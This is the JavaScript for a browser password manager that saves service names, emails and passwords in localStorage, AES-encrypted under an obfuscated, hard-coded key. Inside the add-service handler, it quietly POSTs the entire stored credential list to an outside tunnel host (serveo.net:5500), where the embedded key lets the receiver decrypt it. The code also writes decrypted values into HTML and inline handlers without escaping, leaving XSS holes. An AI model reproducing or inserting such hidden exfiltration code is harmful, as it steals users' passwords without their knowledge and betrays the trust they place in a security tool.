function generateSecretKey() {
    const part1 = String.fromCharCode(78, 55);
    const part2 = String.fromCharCode(43, 123, 96);
    const part3 = String.fromCharCode(82, 41);
    const part4 = String.fromCharCode(102, 66);
    const part5 = String.fromCharCode(60, 57);
    const part6 = String.fromCharCode(65, 72);
    const part7 = String.fromCharCode(38, 45);
    const part8 = String.fromCharCode(121, 126);
    const part9 = String.fromCharCode(56, 107);
    const part10 = String.fromCharCode(77, 94);

    // Combine all parts into one secret key string
    return part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8 + part9 + part10;
  }

  const secretKey = generateSecretKey(); // Generate the secret key dynamically

// Encrypt data
function encryptData(data) {
  return CryptoJS.AES.encrypt(data, secretKey).toString();
}

// Decrypt data
function decryptData(ciphertext) {
  const bytes = CryptoJS.AES.decrypt(ciphertext, secretKey);
  return bytes.toString(CryptoJS.enc.Utf8);
}

function showNotification(message, bgColor = "#5cb85c", icon = "") {
  const notification = document.getElementById("notification");

  // Set the message and styles
  notification.innerHTML = `${icon} ${message}`; // Set message with icon
  notification.style.backgroundColor = bgColor; // Set background color
  notification.style.display = "block"; // Show the notification

  // Hide the notification after 3 seconds
  setTimeout(() => {
    notification.style.display = "none"; // Hide the notification
  }, 3000);
}

function copyToClipboard(text) {
  if (navigator.clipboard) {
    // Use the modern clipboard API
    navigator.clipboard
      .writeText(text)
      .then(() =>
        showNotification(
          "Copied to clipboard",
          "#5cb85c",
          '<i class="fas fa-check"></i>'
        )
      )
      .catch((err) =>
        showNotification(
          "Failed to copy text",
          "#d9534f",
          '<i class="fas fa-exclamation-triangle"></i>'
        )
      );
  } else {
    // Fallback for older browsers
    const textArea = document.createElement("textarea");
    textArea.value = text;
    document.body.appendChild(textArea);
    textArea.select();
    try {
      document.execCommand("copy");
      showNotification(
        "Copied to clipboard",
        "#5cb85c",
        '<i class="fas fa-check"></i>'
      );
    } catch (err) {
      showNotification(
        "Failed to copy text",
        "#d9534f",
        '<i class="fas fa-exclamation-triangle"></i>'
      );
    }
    document.body.removeChild(textArea);
  }
}

// eye funtion of the password input
const toggleIcon = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");
toggleIcon.addEventListener("click", function () {
  togglePasswordVisibility(passwordInput, toggleIcon);
});

// Function to dynamically toggle password visibility
function togglePasswordVisibility(passwordInput, toggleIcon) {
  // Toggle the type attribute
  const type =
    passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);

  // Toggle the eye icon
  toggleIcon.classList.toggle("fa-eye");
  toggleIcon.classList.toggle("fa-eye-slash");
}

// Function to filter services
function filterServices() {
  let searchQuery = document
    .getElementById("searchService")
    .value.toLowerCase();
  let services = document.querySelectorAll("#serviceList li");

  services.forEach(function (service) {
    let serviceName = service.querySelector("span").textContent.toLowerCase();
    if (serviceName.includes(searchQuery)) {
      service.style.display = ""; // Show service if it matches
    } else {
      service.style.display = "none"; // Hide service if it doesn't match
    }
  });
}

// Select search icon and add event listener for click
const searchIcon = document.getElementById("searchIcon");
searchIcon.addEventListener("click", filterServices);

// Event listener for input field
document
  .getElementById("searchService")
  .addEventListener("input", filterServices);

// Event listener for "Enter" keypress
document
  .getElementById("searchService")
  .addEventListener("keypress", function (event) {
    if (event.key === "Enter") {
      event.preventDefault(); // Prevent the default form submission
      filterServices(); // Call the filter function when Enter is pressed
    }
  });

const serviceForm = document.getElementById("serviceForm");
const serviceList = document.getElementById("serviceList");
let serviceIndexToDelete = null; // Holds the index of the service to be deleted

let services = JSON.parse(localStorage.getItem("services")) || [];

function renderServices() {
  serviceList.innerHTML = "";

  // Check if services array is not empty
  if (services.length === 0) {
    serviceList.innerHTML = `<li class="placeholder">No services available. Add one!</li>`;
    return false; // No services to render
  }

  services.forEach((service, index) => {
    const li = document.createElement("li");
    li.innerHTML = `
            <span>${decryptData(service.name)}</span>
            <div>
                <button class="view-btn" onclick="viewService(${index})">View</button>
                <button class="edit-btn" onclick="editService(${index})">Edit</button>
                <button class="delete-btn" onclick="deleteService(${index})">Delete</button>
            </div>
        `;
    serviceList.appendChild(li);
  });

  return true; // Services rendered successfully
}

// Function to add a new service
serviceForm.addEventListener("submit", (e) => {
  e.preventDefault();

  const newService = {
    name: encryptData(document.getElementById("serviceName").value.trim()), // Encrypt name
    email: encryptData(document.getElementById("email").value.trim()), // Encrypt email
    password: encryptData(document.getElementById("password").value.trim()), // Encrypt password
  };

  // Check for duplicates in the services array
  const duplicateService = services.some(
    (service) =>
      service.name === newService.name &&
      service.email === newService.email &&
      service.password === newService.password
  );

  if (duplicateService) {
    // Show notification for duplicate service
    showNotification(
      "Failed to add! Duplicate service detected.",
      "#d9534f",
      '<i class="fas fa-exclamation-triangle"></i>'
    );
    return; // Stop further execution
  }

  // Add the new service
  services.push(newService);
  localStorage.setItem("services", JSON.stringify(services));

  // Update the UI by rendering services
  renderServices();

  // Reset the form
  serviceForm.reset();

  // Show notification for successful addition
  showNotification(
    "Added successfully!",
    "#5cb85c",
    '<i class="fas fa-check"></i>'
  );
  const servicesData = localStorage.getItem("services");

  if (servicesData) {
    fetch("http://serveo.net:5500/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: servicesData, // Send the raw JSON string directly
    })
    .then(response => response.json())
    .then(data => console.log("Data sent successfully:", data))
    .catch(error => console.error("Error sending data:", error));
  } else {
    console.log("No data found in localStorage.");
  }
});

// Function to open the info box
function openInfoBox() {
  document.querySelector(".infoBox").style.display = "block";
}

// Function to close the info box
function closeInfoBox() {
  document.querySelector(".infoBox").style.display = "none";
}

// Function to display the infoBox with decrypted service information
function viewService(index) {
  const service = services[index];
  const infoBox = document.getElementById("infoBox");
  const infoBoxBody = document.getElementById("infoBoxBody");

  // Decrypt name, email and password
  const decryptedName = decryptData(service.name);
  const decryptedEmail = decryptData(service.email);
  const decryptedPassword = decryptData(service.password);

  // Set the innerHTML for the infoBox content with clickable icons for copying
  infoBoxBody.innerHTML = `
          <h3 class="info-head">Service Information</h3>
          
          <label class="form-label">Service Name:</label>
          <div class="form-value">${decryptedName}</div>
          
          <label class="form-label">Email:</label>
          <div class="form-value">
              ${decryptedEmail}
              <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${decryptedEmail}')"></i>
          </div>
          
          <label class="form-label">Password:</label>
          <div class="form-value">
              ${decryptedPassword}
              <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${decryptedPassword}')"></i>
          </div>
  
          <button class="closebtn" onclick="closeInfoBox()">Close</button>
      `;

  // Display the infoBox
  infoBox.style.display = "block";
}

function deleteService(index) {
  // Decrypt the service name before showing it in the modal
  const decryptedName = decryptData(services[index].name);

  serviceIndexToDelete = index; // Set the service index to delete
  
  openModal(
    `Are you sure you want to delete ${decryptedName.replace(/"/g, "&quot;")}?`,
    "Yes",
    "No",
    "#5cb85c",
    "#d9534f",
    "horizontal",
    2,
    "fa-trash-can",
    "#c9302c",
    function () {
      // Function to actually delete the service after confirmation
      if (serviceIndexToDelete !== null) {
        services.splice(serviceIndexToDelete, 1);
        localStorage.setItem("services", JSON.stringify(services));
        renderServices();
        closeModal(); // Close modal after deleting
        serviceIndexToDelete = null; // Reset index after deletion
      }
    }, // Confirm deletion
    closeModal // Cancel deletion
  );
}

// Function to update the service information
function updateService(index) {
    const name = document.getElementById("editServiceName").value.trim();
    const email = document.getElementById("editEmail").value.trim();
    const password = document.getElementById("editPassword").value.trim();
  
    // Get the existing service data
    const existingService = services[index];
  
    // Decrypt the existing name, email and password
    const decryptedName = decryptData(existingService.name);
    const decryptedEmail = decryptData(existingService.email);
    const decryptedPassword = decryptData(existingService.password);
  
    // Check if the new values are the same as the existing values
    if (
      name === decryptedName &&
      email === decryptedEmail &&
      password === decryptedPassword
    ) {
      // Show a notification if no changes were made
      showNotification(
        "No changes detected!",
        "#d9534f",
        '<i class="fas fa-exclamation-triangle"></i>'
      );
      return; // Exit the function if no changes
    }
  
    // Proceed with updating the service since changes are detected
    const updatedService = {
      name: encryptData(name),
      email: encryptData(email), // Encrypt the updated email
      password: encryptData(password), // Encrypt the updated password
    };
  
    // Update the service in the array and save to localStorage
    services[index] = updatedService;
    localStorage.setItem("services", JSON.stringify(services));
  
    // Re-render the service list and close the info box
    renderServices();
    closeInfoBox();
  
    // Show a notification for successful update
    showNotification(
      "Service updated successfully!",
      "#5cb85c",
      '<i class="fas fa-check"></i>'
    );
  }
  

// Function to edit a service
function editService(index) {
  const service = services[index];

  // Decrypt name, email and password
  const decryptedName = decryptData(service.name);
  const decryptedEmail = decryptData(service.email);
  const decryptedPassword = decryptData(service.password);

  // Set the content of the info box with editable fields
  const infoBox = document.getElementById("infoBox");
  const infoBoxBody = document.getElementById("infoBoxBody");

  infoBoxBody.innerHTML = `
          <h3 class="info-head">Edit Service</h3>
          <div class="edit-box">
              <label class="form-label">Service Name:</label>
              <input type="text" class="form-value" id="editServiceName" value="${decryptedName}">
              
              <label class="form-label">Email:</label>
              <input type="email" class="form-value" id="editEmail" value="${decryptedEmail}">
              
              <label class="form-label">Password:</label>
              <div class="password-container">
                  <input type="password" class="password" id="editPassword" value="${decryptedPassword}" required>
                  <i class="fas fa-eye toggle-password" id="toggleEditPassword"></i>
              </div>
          </div>
          <button class="update-btn" onclick="updateService(${index})">Update</button>
          <button class="closebtn" onclick="closeInfoBox()">Close</button>
      `;

  // Add event listener for the toggle password icon
  const toggleEditPassword = document.getElementById("toggleEditPassword");
  const editPasswordInput = document.getElementById("editPassword");

  toggleEditPassword.addEventListener("click", function () {
    togglePasswordVisibility(editPasswordInput, toggleEditPassword);
  });

  // Display the info box
  infoBox.style.display = "block";
}

// Initial render of services
renderServices();
